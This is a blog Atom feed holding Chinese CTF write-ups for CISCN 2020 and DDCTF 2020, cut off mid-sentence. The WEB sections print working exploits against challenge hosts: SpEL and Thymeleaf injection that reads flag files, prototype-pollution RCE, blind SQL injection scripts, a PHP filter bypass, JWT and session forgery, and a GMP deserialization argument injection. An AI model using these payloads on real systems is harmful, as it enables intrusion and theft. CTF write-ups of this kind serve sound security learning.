<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rmb122&#39;s Notebook</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rmb122.com/"/>
  <updated>2020-09-19T17:25:09.958Z</updated>
  <id>https://rmb122.com/</id>
  
  <author>
    <name>rmb122</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020 CISCN 华东北赛区 WEB Writeup</title>
    <link href="https://rmb122.com/2020/09/19/2020-CISCN-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-WEB-Writeup/"/>
    <id>https://rmb122.com/2020/09/19/2020-CISCN-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-WEB-Writeup/</id>
    <published>2020-09-19T14:14:55.000Z</published>
    <updated>2020-09-19T17:25:09.958Z</updated>
    
    <content type="html"><![CDATA[<p>一共 6 题 WEB, 我一个人拿了 4 个一血, 还有一题全场 0 解. 然而没有 pwn 爷爷依旧被吊打, 而且题目质量是真的差, 明年再打国赛我是傻逼.</p><a id="more"></a><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><a href="http://172.20.29.103:80/flag.php" target="_blank" rel="noopener">http://172.20.29.103:80/flag.php</a> 直接返回 flag. 你们赛宁没有题目复审的么?</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>随便 fuzz 根据报错得知是 sepl，构造 payload T%00 绕过过滤直接读文件即可, fix 的时候给看源码, 发现出题人正则写成了 <code>&quot;T\\\\x00&quot;</code>, 应该是想到了要过滤的, 你们赛宁没有题目复审的么? x2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.29.104:8080</span><br><span class="line">Content-Length: 91</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;172.20.29.104:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;172.20.29.104:8080&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,zh-TW;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">expr&#x3D;T%00(java.nio.file.Files).readAllLines(T%00(java.nio.file.Paths).get%00(&#39;&#x2F;flag.txt&#39;))</span><br></pre></td></tr></table></figure><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>扫出来只有 static 文件夹，根据 server header 得知服务器用的 nginx，同时存在配置错误，可以目录穿越读取文件.<br><a href="http://172.20.29.107/static../app.js" target="_blank" rel="noopener">http://172.20.29.107/static../app.js</a>, 在源码中发现使用了 <code>express-fileupload</code> ，存在原型链污染，可以结合 ejs 利用，直接 rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;4_pATh_y0u_CaNN07_Gu3ss HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.29.107</span><br><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 263</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;------------------------a4826c30ee705335</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--------------------------a4826c30ee705335</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;__proto__.outputFunctionName&quot;</span><br><span class="line"></span><br><span class="line">_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag.txt &gt; flag.txt&#39;);var __tmp2</span><br><span class="line">--------------------------a4826c30ee705335--</span><br></pre></td></tr></table></figure><p>然后读取 <a href="http://172.20.29.107/static../flag.txt" target="_blank" rel="noopener">http://172.20.29.107/static../flag.txt</a> 即可</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>robots.txt 得到 hint.txt, 可以得到 sql 语句， 根据其特性，用 \ 来注入， 之后绕 waf 注入出密码，登陆后得到 c2ZtdHFs.php, </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">url = <span class="string">'http://172.20.29.102/'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">'0x5e'</span></span><br><span class="line">table = string.ascii_letters + <span class="string">'_'</span> + string.digits</span><br><span class="line">table = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line">raw_flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        t = flag + hex(i)[<span class="number">2</span>:].rjust(<span class="number">0</span>, <span class="string">'2'</span>)</span><br><span class="line">        <span class="comment">#print(t)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'\\'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'||password/**/regexp/**/binary/**/%s#'</span> % t</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = sess.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment">#print(chr(i))</span></span><br><span class="line">            flag += hex(i)[<span class="number">2</span>:].rjust(<span class="number">0</span>, <span class="string">'2'</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            raw_flag += chr(i)</span><br><span class="line">            print(raw_flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">        print(<span class="string">'WARNGIN'</span>)</span><br></pre></td></tr></table></figure><p>用 &amp; 绕一下过滤，即可 rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;c2ZtdHFs.php?gzmtu&#x3D;(sysuem%26sysvem)((currenu%26currenv)((weucmmhecders%26oevennheeders)())) HTTP&#x2F;1.1</span><br><span class="line">A: cat &#x2F;flag.txt</span><br><span class="line">Host: 172.20.29.102</span><br></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>pgsql 注入，双写绕过 select，之后熟悉下语法写脚本注入后登陆就有 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">url = <span class="string">'http://172.20.29.105/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_chr</span><span class="params">(inp)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inp:</span><br><span class="line">        ret += <span class="string">f"||chr(<span class="subst">&#123;ord(i)&#125;</span>)"</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits + <span class="string">'_.-'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">table = string.printable</span><br><span class="line">table = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line">query = <span class="string">'selselectect/**/password/**/from/**/users/**/limit/**/1/**/OFFSET/**/0'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        t = to_chr(flag) + <span class="string">f'||chr(<span class="subst">&#123;i&#125;</span>)'</span></span><br><span class="line">        t = t[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">"admin'/**/or/**/'1'/**/and/**/cast(position(%s/**/in/**/(%s))/**/as/**/bool)/**/and/**/'1"</span> % (t, query)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = sess.post(<span class="string">'http://172.20.29.105/index.php'</span>, data=data)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'hacker'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">'hacker'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Too Young Too Simple'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += chr(i)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">            print(<span class="string">'WARNNING'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">                    t = <span class="string">f'||chr(<span class="subst">&#123;i&#125;</span>)'</span> + to_chr(flag)</span><br><span class="line">                    t = t[<span class="number">2</span>:]</span><br><span class="line">                    data = &#123;</span><br><span class="line">                        <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">                        <span class="string">'password'</span>: <span class="string">"admin'/**/or/**/'1'/**/and/**/cast(position(%s/**/in/**/(%s))/**/as/**/bool)/**/and/**/'1"</span> % (</span><br><span class="line">                        t, query)</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    res = sess.post(<span class="string">'http://172.20.29.105/index.php'</span>, data=data)</span><br><span class="line">                    <span class="comment"># print(res.text)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'hacker'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        print(<span class="string">'hacker'</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'Too Young Too Simple'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        flag = chr(i) + flag</span><br><span class="line">                        print(flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">                        print(<span class="string">'WARNNING'</span>)</span><br></pre></td></tr></table></figure><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>这题目能把人气笑, 全场 0 解, 最后发现放了个 ssrf.php, 无任何提示, 就硬猜, 而且里面的过滤写成了 <code>/file:|http://|php/</code>, 这是过滤了个锤子, 你们赛宁没有题目复审的么? x3</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一共 6 题 WEB, 我一个人拿了 4 个一血, 还有一题全场 0 解. 然而没有 pwn 爷爷依旧被吊打, 而且题目质量是真的差, 明年再打国赛我是傻逼.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="ctf" scheme="https://rmb122.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF 2020 Writeup</title>
    <link href="https://rmb122.com/2020/09/07/DDCTF-2020-Writeup/"/>
    <id>https://rmb122.com/2020/09/07/DDCTF-2020-Writeup/</id>
    <published>2020-09-07T13:48:48.000Z</published>
    <updated>2020-09-07T14:01:51.927Z</updated>
    
    <content type="html"><![CDATA[<p>今年改了赛制, 可以两人组队, 我觉得改的还是不错的, 终于不用现场表演学习逆向和 pwn 了, 成功和 Ary 师傅打到了第三 233</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><p>访问 <a href="http://117.51.136.197/hint/1.txt" target="_blank" rel="noopener">http://117.51.136.197/hint/1.txt</a> 得到使用说明，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;117.51.136.197&#x2F;admin&#x2F;login -d &#39;username&#x3D;1&amp;pwd&#x3D;1&#39; -vv</span><br></pre></td></tr></table></figure><p>拿到 token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:0,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIxIiwidXNlclJvbGUiOiJHVUVTVCIsImV4cCI6MTU5OTQ2OTA0Mn0.fONrD0R3NLTybq2WEP5V7uWTBI_0T0E5utI3MZFngMU&quot;&#125;</span><br></pre></td></tr></table></figure><p>明显的 jwt，需要用这个来 auth，用 <code>https://github.com/brendan-rius/c-jwt-cracker</code> 爆破出来 secret 是 1，修改 userRole 到 ADMIN 就可以拿到客户端的地址 <a href="http://117.51.136.197/B5Itb8dFDaSFWZZo/client" target="_blank" rel="noopener">http://117.51.136.197/B5Itb8dFDaSFWZZo/client</a></p><p>逆向一下得到用签名算法用的是 hmac，key 是 DDCTFWithYou，fuzz 了半天发现是 spel，直接命令执行似乎不行，于是根据提示给的 flag 位置直接读 flag 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"&#123;'a': T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/home/dc2-user/flag/flag.txt'))&#125;"</span></span><br><span class="line">ts = int(time.time())</span><br><span class="line"></span><br><span class="line">sign = base64.b64encode(hmac.new(<span class="string">b'DDCTFWithYou'</span>,msg=<span class="string">f"<span class="subst">&#123;cmd&#125;</span>|<span class="subst">&#123;ts&#125;</span>"</span>.encode(), digestmod=<span class="string">'sha256'</span>).digest())</span><br><span class="line"></span><br><span class="line"><span class="string">'''&#123;"signature":"65+KmCKrBVr6UAsjvSZ/iu1bdpx5xmIJLmAX2Squksk=","command":"'ls'","timestamp":1599189389&#125;'''</span></span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://117.51.136.197/server/command'</span>, json=&#123;</span><br><span class="line">    <span class="string">'signature'</span>: sign.decode(),</span><br><span class="line">    <span class="string">'command'</span>: cmd,</span><br><span class="line">    <span class="string">'timestamp'</span>: ts</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h3 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h3><p>看到 session 就知道明显的是 gin，于是尝试整数溢出，借 9223372036854775807 个卡片就可以成功溢出，只需要还 1 张卡片，白嫖 9223372036854775806 张，兑换得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">恭喜你，买到了礼物，里面有夹心饼干、杜松子酒和一张小纸条，纸条上面写着：url: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12，你能看懂它的含义吗？</span><br></pre></td></tr></table></figure><p>访问 flag 提示不是幸运玩家，但是有了 secretkey 就可以直接伪造 session，对 session base64 解码可以发现用的是 gob 序列化，明显看到 bool, admin 字样，直接自己也搭一个环境设置个 admin session 即可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-contrib/sessions"</span></span><br><span class="line"><span class="string">"github.com/gin-contrib/sessions/cookie"</span></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">store := cookie.NewStore([]<span class="keyword">byte</span>(<span class="string">"Udc13VD5adM_c10nPxFu@v12"</span>))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">"session"</span>, store))</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">"/hello"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">"hello"</span>) != <span class="string">"world"</span> &#123;</span><br><span class="line">session.Set(<span class="string">"admin"</span>, <span class="literal">true</span>)</span><br><span class="line">session.Save()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">"hello"</span>: session.Get(<span class="string">"hello"</span>)&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">":8000"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h3><p>deleteMe 很明显的 shiro，但是尝试了下反序列化，key 全部不对。于是尝试了下新的权限绕过，可以直接越权访问到 index</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;116.85.37.131&#x2F;34867ccfda85234382210155be32525c&#x2F;;&#x2F;web&#x2F;index</span><br></pre></td></tr></table></figure><p>明显有个 img 接口可以任意文件下载，通过 WEB-INF/web.xml 一直套娃下，可以下到一堆 class，但是没有找到有漏洞的接口，在 GitHub 上找了下类似的项目，fuzz 了一堆配置文件，最后找到 <code>WEB-INF/classes/spring-shiro.xml</code>.<br>里面有个 <code>WEB-INF/classes/com/ctf/auth/FilterChainDefinitionMapBuilder.class</code>，找到路由 <code>map.put(&quot;/68759c96217a32d5b368ad2965f625ef/**&quot;, &quot;authc,roles[admin]&quot;);</code>, 进去发现是个 thymeleaf 渲染，但是要绕之前的 com.ctf.util.SafeFilter.</p><p>绕了半天最后用 ProcessBuiler 弹 shell 发现连 ls 都没权限执行，于是只好回到 java 用相关 API 读文件，构造 payload 用 File 来列目录，发现 flag 就在 /flag_is_here</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># /flag_is_here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    sess = requests.session()</span><br><span class="line">    content = <span class="string">'''</span></span><br><span class="line"><span class="string">    [[$&#123; T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]&#123;106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101&#125;)).getConstructors()[1].newInstance(T(String).valueOf(new char[]&#123;47&#125;)).listFiles()[%d] &#125;]]</span></span><br><span class="line"><span class="string">    '''</span>% i</span><br><span class="line">    res = sess.post(<span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/customize"</span>, &#123;</span><br><span class="line">        <span class="string">'content'</span>: content</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">#[[$&#123; (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]&#123;106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114&#125;)).getConstructors()[0].newInstance(T(String).valueOf(new char[]&#123;47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 101&#125;)))).next() &#125;]]</span></span><br><span class="line"></span><br><span class="line">    uuid = res.text[res.text.find(<span class="string">'./render/'</span>)+len(<span class="string">'./render/'</span>):res.text.find(<span class="string">'./render/'</span>)+len(<span class="string">'./render/2b32ce0c2a9292af4fdfe3333058c02c'</span>)]</span><br><span class="line"></span><br><span class="line">    res = sess.get(<span class="string">f'http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/render/<span class="subst">&#123;uuid&#125;</span>'</span>)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure><p>最后用 Scanner 这个类，方法名里面没有 read， payload 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[$&#123; (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]&#123;106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114&#125;)).getConstructors()[0].newInstance(T(String).valueOf(new char[]&#123;47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 101&#125;)))).next() &#125;]]</span><br></pre></td></tr></table></figure><h3 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h3><p>GMP 的一个 CVE，百度就能搜到, 可以覆盖任意对象的任意属性. <a href="https://bugs.php.net/bug.php?id=70513" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=70513</a>.<br>访问 <a href="http://117.51.137.166/hint/hint.php" target="_blank" rel="noopener">http://117.51.137.166/hint/hint.php</a> 拿到前半部分<br>然后覆盖 $mc 的 flag 导致参数注入就能读到后半部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$inj = <span class="string">"-exec cat &#123;&#125; ;"</span>;</span><br><span class="line">$inner = <span class="string">'s:1:"3";a:3:&#123;s:4:"flag";s:'</span>.strlen($inj).<span class="string">':"'</span>.$inj.<span class="string">'";s:2:"hi";s:2:"aa";i:0;O:12:"DateInterval":1:&#123;s:1:"y";R:2;&#125;&#125;'</span>;</span><br><span class="line">$exploit = <span class="string">'a:1:&#123;i:0;C:3:"GMP":'</span>.strlen($inner).<span class="string">':&#123;'</span>.$inner.<span class="string">'&#125;&#125;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span> . $exploit . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$a = urlencode($exploit);</span><br><span class="line"></span><br><span class="line">system(<span class="string">"curl http://117.51.137.166/EOf9uk3nSsVFK1LQ.php?bullet=$a"</span>);</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Android-Reverse-1"><a href="#Android-Reverse-1" class="headerlink" title="Android Reverse 1"></a>Android Reverse 1</h3><p>一个有点不太对劲的AES和tea系列加密算法加一个md5。<br>虽然aes不太对劲，但顺着aes加密函数，在他隔壁找到了aes的解密函数，直接把加密hook成解密就可以解密。<br>arm64的so里的tea解密部分好像被优化了，所以先把apk重打包，扔掉64位的so。<br>32位的so里的tea加密也是一个函数，有一个控制加密的参数8，hook掉把8改为-8，即可以解密。<br>然后md5部分没办法解，顺着给的提示先解tea，再解AES，就可以拿到Flag。</p><h3 id="Android-Reverse-2"><a href="#Android-Reverse-2" class="headerlink" title="Android Reverse 2"></a>Android Reverse 2</h3><p>先github找个脚本，恢复了Armariris的字符串，然后顺着找到动态注册的关键函数。</p><p>包名如第一题，猜测算法也基本同第一题，hook了一下发现aes没变，tea加密变化了，可能是密钥之类的变了，不过没事还是可以直接Hook改参数。<br>Frida-dexdump确认了一下，Java层啥都没有。</p><p>所以还是直接Hook加密改成解密就可以得到Flag。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="真·签到题"><a href="#真·签到题" class="headerlink" title="真·签到题"></a>真·签到题</h3><p>公告板里面有</p><h3 id="一起拼图吗"><a href="#一起拼图吗" class="headerlink" title="一起拼图吗"></a>一起拼图吗</h3><p>ChaMD5 之前有类似的题目，github 上有解题脚本 <a href="https://github.com/virink/puzzle_tool" target="_blank" rel="noopener">https://github.com/virink/puzzle_tool</a>, 用模式 4 DiffRGB 就能直接拼回来</p><h3 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h3><p>一共 5 个轮密钥，其中很明显因为只是异或 + 位移的关系， k3, k4 可以合并成一个，实际上有效的是 4 个 0-4096 